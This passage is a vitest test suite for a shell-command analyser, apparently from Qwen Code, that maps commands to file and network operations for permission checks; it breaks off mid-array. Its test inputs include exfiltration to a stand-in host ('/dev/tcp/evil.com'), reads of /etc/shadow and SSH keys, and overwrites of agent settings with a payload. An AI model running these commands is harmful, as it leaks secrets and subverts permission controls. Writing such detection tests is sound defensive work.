/**
 * @license
 * Copyright 2025 Qwen team
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect } from 'vitest';
import os from 'node:os';
import {
  extractShellOperations,
  extractShellOperationsAcrossCommand,
} from './shell-semantics.js';
import type { ShellOperation } from './shell-semantics.js';

const CWD = '/home/user/project';
const SETTINGS = `${CWD}/.qwen/settings.json`;
const REPO_SETTINGS = '/repo/.qwen/settings.json';

// Helper: sort ops for stable comparison
function sorted(ops: ShellOperation[]) {
  return [...ops].sort((a, b) =>
    `${a.virtualTool}:${a.filePath ?? ''}:${a.domain ?? ''}`.localeCompare(
      `${b.virtualTool}:${b.filePath ?? ''}:${b.domain ?? ''}`,
    ),
  );
}

const fileOp =
  (virtualTool: ShellOperation['virtualTool']) =>
  (filePath: string): ShellOperation => ({ virtualTool, filePath });
const read = fileOp('read_file');
const write = fileOp('write_file');
const edit = fileOp('edit');
const dir = fileOp('list_directory');
const web = (domain: string): ShellOperation => ({
  virtualTool: 'web_fetch',
  domain,
});
/** A write whose path was resolved against a cwd the analysis cannot know. */
const uncertainWrite = (
  filePath: string,
  pathMayDependOnCwd = true,
): ShellOperation => ({
  virtualTool: 'write_file',
  filePath,
  cwdUnknown: true,
  pathMayDependOnCwd,
});
const ops = (command: string) => extractShellOperations(command, CWD);
const across = (command: string) =>
  extractShellOperationsAcrossCommand(command, '/repo');
const expectSorted = (command: string, expected: ShellOperation[]) =>
  expect(sorted(ops(command))).toEqual(expected);
type Row = [title: string, command: string, expected: ShellOperation[]];

describe('extractShellOperations', () => {
  it.each<Row>([
    ['returns [] for empty string', '', []],
    ['returns [] for whitespace', '   ', []],
    ['returns [] for unknown commands', 'frobnicate /etc/passwd', []],
    ['returns [] for env-var assignments', 'FOO=bar', []],
    ['cat: absolute path', 'cat /etc/passwd', [read('/etc/passwd')]],
    [
      'cat: relative path resolved against cwd',
      'cat secrets.txt',
      [read(`${CWD}/secrets.txt`)],
    ],
    ['cat: flags are ignored', 'cat -n /etc/hosts', [read('/etc/hosts')]],
    [
      'cat: quoted path',
      "cat '/etc/my file.conf'",
      [read('/etc/my file.conf')],
    ],
    [
      'head: -n value not treated as path',
      'head -n 10 /var/log/syslog',
      [read('/var/log/syslog')],
    ],
    [
      'grep: first positional is pattern, rest are files',
      'grep password /etc/shadow',
      [read('/etc/shadow')],
    ],
    ['grep: -r becomes list_directory', 'grep -r secret /etc', [dir('/etc')]],
    // -f consumes patterns.txt and sets hasPatternFlag, so every positional
    // is a file path (no slice(1)).
    [
      'grep: -f patternfile — positionals are file paths',
      'grep -f patterns.txt /etc/hosts',
      [read('/etc/hosts')],
    ],
    [
      'grep: -n is line numbers and does not consume the pattern',
      'grep -n pattern /etc/hosts',
      [read('/etc/hosts')],
    ],
    [
      'grep: -A value not treated as path',
      'grep -A 3 error /var/log/app.log',
      [read('/var/log/app.log')],
    ],
    ['ls: no args defaults to cwd', 'ls', [dir(CWD)]],
    ['ls: explicit dir', 'ls /var/log', [dir('/var/log')]],
    [
      'find: first positional is starting dir',
      'find /etc -name "*.conf"',
      [dir('/etc')],
    ],
    ['find: no starting dir defaults to cwd', 'find -name "*.txt"', [dir(CWD)]],
    [
      'find: extracts write ops from exec clauses',
      'find . -exec cp payload .qwen/settings.json ;',
      [dir(CWD), read(`${CWD}/payload`), write(SETTINGS)],
    ],
    [
      'touch: creates a file (write_file)',
      'touch /tmp/new.txt',
      [write('/tmp/new.txt')],
    ],
    [
      'mkdir: creates a directory (write_file)',
      'mkdir -p /tmp/a/b',
      [write('/tmp/a/b')],
    ],
    [
      'rm: single file is edit',
      'rm /tmp/secret.txt',
      [edit('/tmp/secret.txt')],
    ],
    ['rm -rf: directory is edit', 'rm -rf /tmp/dir', [edit('/tmp/dir')]],
    [
      'chmod: mode arg is skipped, file is edit',
      'chmod 755 /usr/local/bin/script',
      [edit('/usr/local/bin/script')],
    ],
    [
      'chown: owner arg is skipped, file is edit',
      'chown root:root /etc/config',
      [edit('/etc/config')],
    ],
    [
      'sed without -i: read_file',
      "sed 's/foo/bar/' /etc/hosts",
      [read('/etc/hosts')],
    ],
    ['sed -i: edit', "sed -i 's/foo/bar/' /etc/hosts", [edit('/etc/hosts')]],
    [
      'sed combined short flags containing i: edit',
      "sed -nie 's/foo/bar/' /etc/hosts",
      [edit('/etc/hosts')],
    ],
    [
      'awk: program expression filtered, file identified',
      "awk '{print $1}' /etc/passwd",
      [read('/etc/passwd')],
    ],
    [
      'awk -F: separator consumed, file identified',
      "awk -F: '{print $2}' /etc/shadow",
      [read('/etc/shadow')],
    ],
    [
      'awk -i inplace: edits files in place',
      'awk -i inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'awk --include=inplace: edits files in place',
      'awk --include=inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'gawk -i inplace: edits files in place',
      'gawk -i inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'redirect >: write_file',
      'echo hello > /tmp/out.txt',
      [write('/tmp/out.txt')],
    ],
    [
      'redirect >>: write_file',
      'date >> /var/log/app.log',
      [write('/var/log/app.log')],
    ],
    [
      'curl: extracts domain',
      'curl https://api.example.com/data',
      [web('api.example.com')],
    ],
    [
      'wget: extracts domain',
      'wget https://example.com/file.tar.gz',
      [web('example.com')],
    ],
    [
      'sudo cat: transparent wrapper',
      'sudo cat /etc/sudoers',
      [read('/etc/sudoers')],
    ],
    [
      'sudo -u user cat: strips flags before inner cmd',
      'sudo -u root cat /etc/shadow',
      [read('/etc/shadow')],
    ],
    [
      'env cmd: transparent wrapper',
      'env cat /etc/hosts',
      [read('/etc/hosts')],
    ],
    [
      'timeout cmd: transparent wrapper',
      'timeout 30 wget https://example.com',
      [web('example.com')],
    ],
    // $SECRET_FILE starts with $, filtered by looksLikePath
    ['$VAR paths are not included', 'cat $SECRET_FILE', []],
  ])('%s', (_title, command, expected) => {
    expect(ops(command)).toEqual(expected);
  });

  const curlOut = [web('api.example.com'), write('/tmp/out.json')];
  const wgetOut = [web('example.com'), write('/tmp/file.gz')];
  it.each<Row>([
    ['cat: multiple files', 'cat /a/b /c/d', [read('/a/b'), read('/c/d')]],
    [
      'tail: multiple files with flag',
      'tail -c 100 /a /b',
      [read('/a'), read('/b')],
    ],
    ['diff: two files', 'diff /old /new', [read('/new'), read('/old')]],
    [
      'grep: -e flag shifts all positionals to paths',
      'grep -e password /etc/passwd /etc/shadow',
      [read('/etc/passwd'), read('/etc/shadow')],
    ],
    [
      'cp: src=read, dst=write',
      'cp /etc/passwd /tmp/backup',
      [read('/etc/passwd'), write('/tmp/backup')],
    ],
    [
      'mv: src=edit, dst=write',
      'mv /tmp/a /tmp/b',
      [edit('/tmp/a'), write('/tmp/b')],
    ],
    [
      'sed -e: all positionals are files',
      "sed -e 's/foo/bar/' /a /b",
      [read('/a'), read('/b')],
    ],
    [
      'dd if= and of=',
      'dd if=/dev/sda of=/tmp/disk.img',
      [read('/dev/sda'), write('/tmp/disk.img')],
    ],
    [
      'rsync destination is a write',
      'rsync /tmp/payload .qwen/settings.json',
      [read('/tmp/payload'), write(SETTINGS)],
    ],
    [
      'curl: -o flag value emits write op and is not treated as URL',
      'curl -o /tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'curl: attached -o flag value emits write op',
      'curl -o/tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'curl: attached -o= flag value emits write op',
      'curl -o=/tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'wget: -O flag value emits write op and is not treated as URL',
      'wget -O /tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'wget: attached -O flag value emits write op',
      'wget -O/tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'wget: attached -O= flag value emits write op',
      'wget -O=/tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'cat src > dst: both read and write',
      'cat /etc/passwd > /tmp/copy',
      [read('/etc/passwd'), write('/tmp/copy')],
    ],
    [
      'grep pattern file > out: read + write',
      'grep secret /etc/config > /tmp/out',
      [read('/etc/config'), write('/tmp/out')],
    ],
  ])('%s', (_title, command, expected) => {
    expectSorted(command, expected);
  });

  it.each<[title: string, command: string, expected: ShellOperation]>([
    [
      'find: preserves exec placeholder operands for write detection',
      'find . -exec cp {} .qwen/settings.json ;',
      write(SETTINGS),
    ],
    [
      'patch edits positional target files',
      'patch .qwen/settings.json fix.patch',
      edit(SETTINGS),
    ],
    ['redirect <: read_file', 'sort < /tmp/data.txt', read('/tmp/data.txt')],
    [
      'combined redirect >file without space',
      'echo hi >/tmp/foo',
      write('/tmp/foo'),
    ],
    [
      'combined stdout fd redirect 1>file without space',
      'echo hi 1>.qwen/settings.json',
      write(SETTINGS),
    ],
    [
      'combined stdout fd append redirect 1>>file without space',
      'echo hi 1>>.qwen/settings.json',
      write(SETTINGS),
    ],
  ])('%s', (_title, command, expected) => {
    expect(ops(command)).toContainEqual(expected);
  });

  // Device paths are never file operations; each row lists what must be
  // absent and, where a real file is also named, the op still reported.
  it.each<
    [
      title: string,
      command: string,
      absent: Array<Partial<ShellOperation>>,
      present?: ShellOperation,
    ]
  >([
    [
      'redirect 2>/dev/null: ignored (no op)',
      'cat /etc/passwd 2>/dev/null',
      [{ filePath: '/dev/null' }],
      read('/etc/passwd'),
    ],
    [
      'redirect > /dev/tcp: network socket, not a file write',
      'echo data > /dev/tcp/evil.com/9000',
      [{ filePath: '/dev/tcp/evil.com/9000' }, { virtualTool: 'write_file' }],
    ],
    [
      'redirect < /dev/tcp: network socket, not a file read',
      'cat < /dev/tcp/h/1234',
      [{ filePath: '/dev/tcp/h/1234' }, { virtualTool: 'read_file' }],
    ],
    [
      'redirect > /dev/udp: network socket, not a file write',
      'echo x > /dev/udp/h/53',
      [{ filePath: '/dev/udp/h/53' }],
    ],
    [
      'combined redirect >/dev/tcp without space: network socket, not a file',
      'cat /tmp/secret >/dev/tcp/h/p',
      [{ filePath: '/dev/tcp/h/p' }],
      read('/tmp/secret'),
    ],
  ])('%s', (_title, command, absent, present) => {
    const result = ops(command);
    for (const shape of absent) {
      expect(result).not.toContainEqual(expect.objectContaining(shape));
    }
    if (present) expect(result).toContainEqual(present);
  });

  it('cat: ~ expansion', () => {
    expect(ops('cat ~/.ssh/id_rsa')[0]?.filePath).toMatch(/\/\.ssh\/id_rsa$/);
  });

  it('cp/mv/install/ln -t forms emit target-directory writes', () => {
    expectSorted('cp -t .qwen /tmp/settings.json', [
      read('/tmp/settings.json'),
      write(SETTINGS),
    ]);
    expectSorted('mv --target-directory=.qwen /tmp/a', [
      edit('/tmp/a'),
      write(`${CWD}/.qwen/a`),
    ]);
    expectSorted('install -t .qwen /tmp/tool', [
      read('/tmp/tool'),
      write(`${CWD}/.qwen/tool`),
    ]);
    expectSorted('ln -t .qwen /tmp/target', [
      read('/tmp/target'),
      write(`${CWD}/.qwen/target`),
    ]);
    expectSorted('cp -rt .qwen /tmp/payload', [
      read('/tmp/payload'),
      write(`${CWD}/.qwen/payload`),
    ]);
  });

  it('perl -i edits file operands', () => {
    expect(ops("perl -i -pe 's/x/y/' .qwen/settings.json")).toEqual([
      edit(SETTINGS),
    ]);
    expect(ops("perl -i -e 's/x/y/' .qwen/settings.json")).toEqual([
      edit(SETTINGS),
    ]);
  });

  it('patch edits output flag targets', () => {
    for (const command of [
      'patch --output=.qwen/settings.json -i fix.patch',
      'patch -o .qwen/settings.json -i fix.patch',
    ]) {
      expect(ops(command)).toContainEqual(edit(SETTINGS));
    }
  });

  it('sort -o emits the output path as a write', () => {
    expectSorted('sort -o .qwen/settings.json /tmp/in', [
      read('/tmp/in'),
      write(SETTINGS),
    ]);
    expectSorted('sort --output=.qwen/settings.json /tmp/in', [
      read('/tmp/in'),
      write(SETTINGS),
    ]);
  });

  // `N>&M`, `>&M`, `N<&M` and `N>&-` duplicate or close a descriptor; bash
  // opens no file. They used to come back as a write to `<cwd>/&1`, which a
  // bare Edit/Write deny (the headless -p default) turned into a denial.
  it.each<[command: string, expected: ShellOperation[]]>([
    ['df -hT / 2>&1', []],
    ['df -hT / 1>&2', []],
    ['df -hT / >&2', []],
    ['df -hT / 2>&-', []],
    ['df -hT / >&-', []],
    ['cat <&0', []],
    ['df -hT / 2>&1 | head -5', []],
    ['df -hT / >&"1"', []],
    ['cat /etc/hosts 2>&1', [read('/etc/hosts')]],
    ['echo hi > out.txt 2>&1', [write(`${CWD}/out.txt`)]],
    ['echo hi 2>&1 >out.txt', [write(`${CWD}/out.txt`)]],
  ])('fd duplication is not a file operation: %s', (command, expected) => {
    expectSorted(command, expected);
  });

  it('>&file and 1>&file write the named file, not "&file"', () => {
    expect(ops('echo hi >&.qwen/settings.json')).toEqual([write(SETTINGS)]);
    expect(ops('echo hi 1>&.qwen/settings.json')).toEqual([write(SETTINGS)]);
  });

  // Bash writes a file named `&1` when the `&` is quoted or escaped.
  it.each<[command: string, file: string]>([
    ['printf TXT >"&1"', '&1'],
    ["printf TXT >'&1'", '&1'],
    ['printf TXT >\\&1', '&1'],
    ['printf TXT 2>"&1"', '&1'],
    ['printf TXT >"&"1', '&1'],
    ['printf TXT >"&protected.txt"', '&protected.txt'],
    ['printf TXT >\\&protected.txt', '&protected.txt'],
    ['printf TXT >"x&"', 'x&'],
    ['printf TXT >"notes)"', 'notes)'],
    ["printf TXT >'notes)'", 'notes)'],
    ['printf TXT >notes\\)', 'notes)'],
    ['printf TXT >"&"', '&'],
    ['printf TXT >\\&', '&'],
  ])('quoted or escaped & is part of the file name: %s', (command, file) => {
    expect(ops(command)).toEqual([write(`${CWD}/${file}`)]);
  });

  it('>&$VAR keeps the literal write: it may name a file', () => {
    expect(ops('printf TXT >&$OUT')).toEqual([write(`${CWD}/&$OUT`)]);
  });

  // Only a whole number or `-` is a descriptor; anything else names a file.
  // (`2>&file` and `<&file` are errors in bash; reporting them keeps the
  // check strict.)
  it.each<[command: string, expected: ShellOperation[]]>([
    ['printf TXT >&1.log', [write(`${CWD}/1.log`)]],
    ['printf TXT >&2fa-notes.md', [write(`${CWD}/2fa-notes.md`)]],
    ['printf TXT 2>&protected.txt', [write(`${CWD}/protected.txt`)]],
    ['cat <&protected.txt', [read(`${CWD}/protected.txt`)]],
    ['printf TXT >&"y)"', [write(`${CWD}/y)`)]],
  ])('fd redirect word: %s', (command, expected) => {
    expectSorted(command, expected);
  });

  // After an unquoted `>&`, `N>&` or `<&`, bash reads an unquoted `-` as
  // "close" and starts a new word: `rm >&-notes.txt` closes stdout and
  // removes notes.txt. The command gets that word as an argument, and the
  // whole word also stays a file operation (`&-word`), because the parser
  // doesn't know every command and drops numbers and `$` words as arguments:
  // `tee >&-2` writes `2`, `my-tool >&-notes.txt` may write notes.txt.
  it.each<[command: string, expected: ShellOperation[]]>([
    [
      'rm >&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-notes.txt`)],
    ],
    [
      'rm 1>&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-notes.txt`)],
    ],
    [
      'rm 2>&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-notes.txt`)],
    ],
    ['rm <&-notes.txt', [edit(`${CWD}/notes.txt`), read(`${CWD}/&-notes.txt`)]],
    [
      'rm >&-"notes.txt"',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-notes.txt`)],
    ],
    [
      'cat <&-notes.txt',
      [read(`${CWD}/&-notes.txt`), read(`${CWD}/notes.txt`)],
    ],
    ['printf TXT >&-x', [write(`${CWD}/&-x`)]],
    ['tee >&-2', [write(`${CWD}/&-2`)]],
    ['tee 2>&-2', [write(`${CWD}/&-2`)]],
    ['cat <&-2', [read(`${CWD}/&-2`)]],
    ['tee >&-$HOME/.bashrc', [write(`${CWD}/&-$HOME/.bashrc`)]],
    ['tee >&-{a,b}', [write(`${CWD}/&-{a,b}`)]],
    ['my-tool >&-notes.txt', [write(`${CWD}/&-notes.txt`)]],
    ['rm -- >&--x', [write(`${CWD}/&--x`)]],
    ['printf X >&->&"-x"', [write(`${CWD}/-x`), write(`${CWD}/&->&-x`)]],
    // A closed descriptor can close again: each `>&-` starts a new word, and
    // only the first redirect reports the whole word.
    [
      'rm >&->&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&->&-notes.txt`)],
    ],
    [
      'rm >&-<&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-<&-notes.txt`)],
    ],
    [
      'rm >&-2>&-notes.txt',
      [edit(`${CWD}/notes.txt`), write(`${CWD}/&-2>&-notes.txt`)],
    ],
    ['printf X >&->&-', [write(`${CWD}/&->&-`)]],
    ['tee >&->&y', [write(`${CWD}/&->&y`), write(`${CWD}/y`)]],
    ['df -hT / >&-', []],
    ['df -hT / >&"-"', []],
  ])('unquoted - closes the descriptor: %s', (command, expected) => {
    expectSorted(command, expected);
  });

  // A long chain of closes in one word is walked in a loop: it must not
  // overflow the stack, and the whole word is reported once.
  it.each(['>&-', '<&-', '2>&-'])('a long chain of %s returns', (unit) => {
    const command = `rm ${unit.repeat(20000)}notes.txt`;
    const result = ops(command);
    expect(result).toHaveLength(2);
    expect(result).toContainEqual(edit(`${CWD}/notes.txt`));
  });

  // A quoted or escaped `)` is part of the word; a bare one closes a subshell.
  it.each<[command: string, expected: ShellOperation[]]>([
    ['(echo hi >out.txt)', [write(`${CWD}/out.txt`)]],
    ['(echo hi > out.txt)', [write(`${CWD}/out.txt`)]],
    ['cat "notes)"', [read(`${CWD}/notes)`)]],
    ['rm notes\\)', [edit(`${CWD}/notes)`)]],
  ])('trailing ): %s', (command, expected) => {
    expectSorted(command, expected);
  });

  // `>&` and `<&` aimed at a device: bash discards the output or opens a
  // socket, so no file operation.
  it.each<string>([
    'df -hT / >&/dev/null',
    'df -hT / 1>&/dev/null',
    'cat <&/dev/null',
    'printf TXT >&/dev/tcp/127.0.0.1/80',
  ])('fd redirect to a device is not a file operation: %s', (command) => {
    expectSorted(command, []);
  });

  // A quoted `>` is not a redirect, so `2">"&1` is not fd duplication; bash
  // reads the unquoted `&` as "run in background" and then runs `1`, so no
  // file is written.
  it('2">"&1 is not fd duplication', () => {
    expect(ops('printf X 2">"&1')).toEqual([]);
  });

  // A quoted or escaped `>` ends the word; an adjacent unquoted `>` is still
  // a redirect: `echo x '>'>file` passes `>` to echo and writes `file`.
  it.each<[command: string, file: string]>([
    ["echo x '>'>.qwen/settings.json", '.qwen/settings.json'],
    ['echo x \\>>out2.txt', 'out2.txt'],
    ['echo x ">">out3.txt', 'out3.txt'],
    ["echo x $'\\x3e'>out4.txt", 'out4.txt'],
    ["echo x '&'>out5.txt", 'out5.txt'],
    ['echo x "&">>out6.txt', 'out6.txt'],
    ['echo x \\&>out7.txt', 'out7.txt'],
    ["echo x $'\\x26'>out8.txt", 'out8.txt'],
    ["echo x '>'&>out9.txt", 'out9.txt'],
    ['echo x "&"&>out10.txt', 'out10.txt'],
  ])(
    'a quoted operator before a real redirect keeps the write: %s',
    (command, file) => {
      expect(ops(command)).toEqual([write(`${CWD}/${file}`)]);
    },
  );

  // A quoted word before a descriptor operation keeps its fd semantics.
  it('keeps fd redirects after a quoted word', () => {
    expect(ops("echo hi '>'>&1")).toEqual([]);
    expect(ops("echo hi '>'>&-")).toEqual([]);
    expect(ops("echo hi '>'>&out2.txt")).toEqual([write(`${CWD}/out2.txt`)]);
  });

  // A quoted or escaped `-` is part of the file name: `>&"-x"` writes `-x`.
  it.each<[command: string, file: string]>([
    ['printf TXT >&"-x"', '-x'],
    ["printf TXT >&'-x'", '-x'],
    ['printf TXT >&\\-x', '-x'],
    ['printf TXT 1>&"-x"', '-x'],
    ['printf TXT >&"-1"', '-1'],
    ['rm >&"-"notes.txt', '-notes.txt'],
  ])('quoted or escaped - after >& names a file: %s', (command, file) => {
    expect(ops(command)).toEqual([write(`${CWD}/${file}`)]);
  });

  it('regression: ordinary file redirects still tracked', () => {
    expect(ops('echo hi > out.txt')).toContainEqual(write(`${CWD}/out.txt`));
    expect(ops('sort < in.txt')).toContainEqual(read(`${CWD}/in.txt`));
  });
});

// Shared compound shell analysis for permission rules and AUTO review.
describe('extractShellOperationsAcrossCommand', () => {
  it.each<Row>([
    [
      'tracks literal `cd` across compound segments before resolving writes',
      "cd .qwen && bash -lc 'echo {} > settings.json'",
      [write(REPO_SETTINGS)],
    ],
    [
      'handles leading env assignments before redirected commands',
      'FOO=bar echo x > .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'handles leading env assignments before write commands',
      'FOO=bar tee .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'tracks cwd before leading env assignments',
      "cd .qwen && FOO=bar echo '{}' > settings.json",
      [write(REPO_SETTINGS)],
    ],
    // The foreground form below cannot know where it landed; the backgrounded
    // one can, because it did not move the cwd at all.
    [
      'does not mark later paths uncertain for a backgrounded dynamic `cd`',
      'cd "$TARGET" & echo {} > settings.json',
      [write('/repo/settings.json')],
    ],
    // Over-correction guards: only the backgrounded `cd` is exempt. Both of
    // these pass before and after the change.
    [
      'keeps a foreground `cd` moving the cwd',
      'cd /tmp && echo {} > settings.json',
      [write('/tmp/settings.json')],
    ],
    [
      'keeps a foreground dynamic `cd` marking later paths uncertain',
      'cd "$TARGET" && echo {} > settings.json',
      [uncertainWrite('/repo/settings.json')],
    ],
    [
      'applies a foreground `cd` that follows a backgrounded one',
      'cd /tmp & cd /var && echo {} > settings.json',
      [write('/var/settings.json')],
    ],
    // The actual write is nested two wrapper levels deep.
    [
      'recursively unwraps nested shell wrappers',
      'bash -lc "sh -c \'echo hi > .mcp.json\'"',
      [write('/repo/.mcp.json')],
    ],
    [
      'preserves sibling segments after a shell wrapper',
      "bash -lc 'echo ok' && echo hi > .qwen/settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'splits literal newlines as command boundaries',
      'cd .qwen\ncp /tmp/malicious settings.json',
      [read('/tmp/malicious'), write(REPO_SETTINGS)],
    ],
    [
      'tracks cwd through brace-grouped commands',
      "{ cd .qwen && echo '{}' > settings.json; }",
      [write(REPO_SETTINGS)],
    ],
    [
      'strips grouping and background syntax from command and path tokens',
      '(echo > .qwen/settings.json) && echo > .qwen/hooks/run.sh&',
      [write(REPO_SETTINGS), write('/repo/.qwen/hooks/run.sh')],
    ],
    [
      'does not treat heredoc body lines as executable shell segments',
      [
        'cd .qwen',
        "cat <<'EOF'",
        'cd /tmp',
        'EOF',
        'echo > settings.json',
      ].join('\n'),
      [write(REPO_SETTINGS)],
    ],
    [
      'does not treat quoted heredoc-looking text as a heredoc marker',
      ["echo '<<EOF'", 'cd .qwen', "echo '{}' > settings.json"].join('\n'),
      [write(REPO_SETTINGS)],
    ],
    [
      // bash has no word-boundary requirement for `<<`: `cat<<EOF` is a heredoc.
      'reads a glued heredoc opener the way bash does',
      "cat<<EOF\nit's fine\nEOF\necho '{}' > .qwen/settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'keeps a glued inert heredoc body out of the operations',
      "cat<<'EOF'\nrm -rf /tmp/z\nEOF",
      [],
    ],
    [
      'does not read a shift inside arithmetic as a heredoc opener',
      'echo $((8<<2))',
      [],
    ],
    [
      // Without the arithmetic guard the `2` becomes a delimiter and the next
      // line is swallowed as its body, hiding the settings write.
      'does not let an arithmetic shift swallow the next line as a heredoc body',
      "echo $((8<<2))\necho '{}' > .qwen/settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'recognizes a comment after a subshell terminator',
      "(true)# note <<EOF\necho '{}' > .qwen/settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      // Narrowed fail-closed: without a possible heredoc opener the ambiguous
      // syntax cannot move a body boundary, so the command stays exact.
      'keeps an ANSI-C escaped quote exact without a heredoc opener',
      "printf %s $'a\\'b'; echo hi > out.txt",
      [write('/repo/out.txt')],
    ],
    [
      'keeps an escaped space before a hash exact without a heredoc opener',
      'echo a\\ # harmless; echo hi > out.txt',
      [write('/repo/out.txt')],
    ],
    [
      'keeps a command-substitution close before a hash exact without a heredoc opener',
      'echo $(echo SUB)#note; echo hi > out.txt',
      [write('/repo/out.txt')],
    ],
    [
      // The `(` here is a subshell, not a `$(`: an earlier command
      // substitution on the line must not make this `#` look like word data.
      'reads a hash after a subshell as a comment even after a substitution',
      'echo $(echo ok); (true)# note <<EOF\necho hi > out.txt',
      [write('/repo/out.txt')],
    ],
    [
      // A heredoc that already closed cannot be re-opened by a later
      // ambiguous form, so that form stays inert and the write stays visible.
      'keeps a write visible after a heredoc closed before an escaped quote',
      "cat <<EOF\nbody\nEOF\nprintf %s $'a\\'b'; echo hi > out.txt",
      [write('/repo/out.txt')],
    ],
    [
      'keeps a write visible after a heredoc closed before an escaped-space hash',
      'cat <<EOF\nbody\nEOF\necho a\\ # harmless; echo hi > out.txt',
      [write('/repo/out.txt')],
    ],
    [
      // R25-1 narrowing: `<<` inside arithmetic is a shift, so the escaped
      // quote after it stays inert and the write stays visible.
      'keeps an arithmetic shift inert for a later escaped quote',
      "echo $((8<<2)); printf %s $'a\\'b'; echo hi > out.txt",
      [write('/repo/out.txt')],
    ],
    [
      'keeps a quoted heredoc-looking string inert for a later escaped quote',
      "echo '<<EOF'; printf %s $'a\\'b'; echo hi > out.txt",
      [write('/repo/out.txt')],
    ],
    [
      // The escaped space keeps `#` inside the word, so the redirect is real
      // and stays a plain write now that the uncertainty channel is gone.
      'keeps a redirect after an escaped-space hash visible',
      'echo a\\ # x > evil.txt',
      [write('/repo/evil.txt')],
    ],
    [
      // A definite comment tail is never executed, so its `>` is not a write.
      'drops a redirect inside a definite comment',
      'echo a # x > evil.txt',
      [],
    ],
    [
      'keeps multiline arithmetic from hiding a write',
      "n=$((1\n << 3))\necho '{}' > .qwen/settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'keeps multiline legacy arithmetic from hiding a write',
      "n=$[1\n << 3]\necho '{}' > .qwen/settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'does not treat a hash inside parameter expansion as a comment',
      'echo ${x:- #c} <<EOF\ncd /tmp\nEOF\necho {} > .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      // R25-1 (1): a trailing backslash continues the line before parsing, so
      // the opener on the next physical line is visible and the body's `cd`
      // is data.
      'reads a heredoc opener after a line continuation',
      'cd .qwen \\\n<<EOF\ncd /tmp\nEOF\necho {} > settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      // R25-1 (2): `$((` closing on the same line must not latch the depth.
      'does not latch arithmetic depth past its closing parens',
      'n=$((1+2))\ncat <<EOF\ncd /tmp\nEOF\necho {} > .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      // R25-1 (5): an earlier delimiter survives a later opener that closes,
      // so the write after it is real. Measured with bash, dash and sh: both
      // here-docs close, then `echo {} > .qwen/settings.json` runs.
      'keeps earlier delimiters when a later opener closes',
      'cat <<A && cat <<EO\nA\nEO\necho {} > .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      // Same shape with a backslash-newline inside the opener word. bash glues
      // the continuation into the word (`<<EO` + `cd` becomes the delimiter
      // `EOcd`, `/tmp` becomes cat's argument), so it performs neither the `cd`
      // nor the write: measured, bash/dash/sh exit 1 on `cat /tmp` and create
      // no file. This lexer does not model that fold, so it keeps the later
      // redirect visible. That is the conservative direction, and this case
      // pins the over-report so it cannot silently become a miss.
      'keeps a later redirect visible when a continued opener swallows the line',
      'cat <<A && cat <<EO\\\ncd /tmp\nA\necho {} > .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      // C1: a `<<` inside double quotes is data, not a heredoc opener; the
      // settings write on the next line must still be reported.
      'does not read a heredoc opener inside double quotes',
      'git commit -m "note: use <<EOF here"\nprintf \'{}\' > .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      // C1: an apostrophe inside double quotes is data and must not flip the
      // quote state, or the real `cat <<EOF` is missed and its body's
      // `cd /tmp` relocates the write.
      'keeps an apostrophe inside double quotes from flipping quote state',
      'echo "it\'s fine"\ncat <<EOF\ncd /tmp\nEOF\necho {} > .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'handles `cd --` and other POSIX flag forms before the target',
      "cd -- .qwen && printf '{}' > settings.local.json",
      [write('/repo/.qwen/settings.local.json')],
    ],
    [
      'treats the word after `cd --` as the target even when it starts with dash',
      "cd -- -some-dir && printf '{}' > settings.local.json",
      [write('/repo/-some-dir/settings.local.json')],
    ],
    [
      'resolves the static cwd even when the cd segment carries a >/dev/null redirect',
      "cd .qwen >/dev/null && echo '{}' > settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'reports a redirect on a static cd segment from the starting cwd',
      "cd .qwen > settings.json && echo '{}' > settings.local.json",
      [write('/repo/settings.json'), write('/repo/.qwen/settings.local.json')],
    ],
    [
      'reports a redirect on a dynamic cd segment from the current cwd',
      'cd $TARGET > settings.json',
      [write('/repo/settings.json')],
    ],
    [
      'marks a later cd redirect as cwd-unknown after a dynamic cd',
      'cd $TARGET && cd .qwen > settings.json',
      [uncertainWrite('/repo/settings.json')],
    ],
    [
      'reports a redirect on a backgrounded cd segment without moving cwd',
      "cd .qwen > settings.json & echo '{}' > settings.local.json",
      [write('/repo/settings.json'), write('/repo/settings.local.json')],
    ],
    [
      'tracks static pushd targets like cd targets',
      "pushd .qwen && printf '{}' > settings.local.json",
      [write('/repo/.qwen/settings.local.json')],
    ],
    [
      'marks writes after popd as cwd-unknown',
      "popd && printf '{}' > settings.local.json",
      [uncertainWrite('/repo/settings.local.json')],
    ],
    [
